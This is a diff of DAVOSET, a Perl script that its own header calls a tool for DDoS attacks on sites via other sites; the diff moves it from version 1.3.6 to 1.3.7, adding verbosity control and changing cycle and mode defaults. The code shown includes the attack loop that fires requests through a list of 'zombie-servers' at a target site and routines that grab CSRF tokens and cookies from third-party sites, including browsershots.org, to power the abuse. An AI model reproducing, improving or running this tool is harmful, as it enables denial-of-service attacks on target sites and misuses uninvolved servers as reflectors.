@@ -1,22 +1,23 @@
 #!/usr/bin/perl
 # DDoS attacks via other sites execution tool
-# DAVOSET v.1.3.6
+# DAVOSET v.1.3.7
 # Tool for conducting of DDoS attacks on the sites via other sites
 # Copyright (C) MustLive 2010-2018
-# Last update: 31.08.2018
+# Last update: 17.12.2018
 # http://websecurity.com.ua
 #############################################
 # Settings
-my $version = "1.3.6"; # program version
+my $version = "1.3.7"; # program version
 my $agent = "Mozilla/5.0 (compatible; MSIE 9.0)"; # user agent
 my $default_port = "80"; # default port of the host
 my $show_stat = 1; # show statistic of work
+my $verbose = 1; # show process of work
 my $default_site = ""; # default site for attack
-my $testURL = "http://www.google.com"; # default site for testing botnet
+my $testURL = "http://google.com"; # default site for testing botnet
 my $list_servers = "list_full.txt"; # list of zombie-servers
-my $mode = "1"; # 0 - standard mode, 1 - cyclic mode
+my $mode = "0"; # 0 - standard mode, 1 - cyclic mode
 my $cycles = "1000"; # number of cycles in cyclic mode
-my $max_cycles = "1000"; # maximum number of cycles in cyclic mode
+my $max_cycles = "2000"; # maximum number of cycles in cyclic mode
 my $log = 1; # 0 - turn off, 1 - turn on logging
 my $log_file = "logs.txt"; # log with results of work
 my $cache = 0; # cache bypass
@@ -122,7 +123,8 @@ for ($cycle=0;$cycle<$cycles;$cycle++) {
 	foreach $item (@list) {
 		chomp($item);
 		if ($item && substr($item,0,1) ne "#") {
-			print ++$i."\n";
+			$i++;
+			print "$i\n" if $verbose;
 			my ($url,$method,$file) = split /;/,$item;
 			if ($method eq "POST" or $method eq "XML" or $method eq "WP") {
 				if (open(FILE,"<$file")) {
@@ -132,7 +134,7 @@ for ($cycle=0;$cycle<$cycles;$cycle++) {
 					Attack($site,$url,$method,$params);
 				}
 				else {
-					print "\nFile $file not found.\n"
+					print "\nFile $file not found.\n" if $verbose;
 				}
 			}
 			else {
@@ -143,7 +145,8 @@ for ($cycle=0;$cycle<$cycles;$cycle++) {
 	$req += $i;
 }
 $time2 = (time)[0] if $show_stat;
-print "\nAttack has been conducted.\n";
+print "\n" if $verbose;
+print "Attack has been conducted.\n";
 if ($show_stat) {
 	$time = $time2-$time1;
 	$time |= 1;
@@ -167,7 +170,7 @@ sub Info { # info
 	print qq~
 DDoS attacks via other sites execution tool
 DAVOSET v.$version
-Copyright (C) MustLive 2010-2017
+Copyright (C) MustLive 2010-2018
 
 ~;
 }
@@ -221,7 +224,7 @@ sub Attack { # send request to zombie-server
 		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "$port");
 	}
 	if (!$sock) {
-		print "- The Socket: $!\n";
+		print "- The Socket: $!\n" if $verbose;
 		return;
 	}
 	if ($method eq "BYPASS") {
@@ -306,7 +309,8 @@ sub Test { # test list of zombie-servers
 	foreach $item (@list) {
 		chomp($item);
 		if ($item) {
-			print ++$i." - ";
+			$i++;
+			print $i." - " if $verbose;
 			my ($url,$method,$file) = split /;/,$item;
 			if ($method eq "POST" or $method eq "XML" or $method eq "WP") {
 				if (open(FILE,"<$file")) {
@@ -316,7 +320,7 @@ sub Test { # test list of zombie-servers
 					TestServer($testURL,$url,$method,$params);
 				}
 				else {
-					print "\nFile $file not found.\n"
+					print "\nFile $file not found.\n" if $verbose;
 				}
 			}
 			else {
@@ -376,7 +380,7 @@ sub TestServer { # test zombie-server
 		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "$port");
 	}
 	if (!$sock) {
-		print "The Socket: $!\n";
+		print "The Socket: $!\n" if $verbose;
 		return;
 	}
 	if ($method eq "BYPASS") {
@@ -443,14 +447,14 @@ sub TestServer { # test zombie-server
 	}
 	if ($content =~ /HTTP\/\d.\d (\d\d\d)/){
 		if ($1 >= 400){
-			print "Error ($1)\n";
+			print "Error ($1)\n" if $verbose;
 		}
 		else {
-			print "OK ($1)\n";
+			print "OK ($1)\n" if $verbose;
 		}
 	}
 	else {
-		print "Error\n";
+		print "Error\n" if $verbose;
 	}
 }
 
@@ -464,7 +468,7 @@ sub GetCsrfToken { # get CSRF token
 		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "browsershots.org", PeerPort => "80");
 	}
 	if (!$sock) {
-		print "The Socket: $!\n";
+		print "The Socket: $!\n" if $verbose;
 		return;
 	}
 	print $sock "GET / HTTP/1.1\n";
@@ -503,7 +507,7 @@ sub GetCookie { # get cookie
 		$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "80");
 	}
 	if (!$sock) {
-		print "The Socket: $!\n";
+		print "The Socket: $!\n" if $verbose;
 		return;
 	}
 	print $sock "GET $page HTTP/1.1\n";
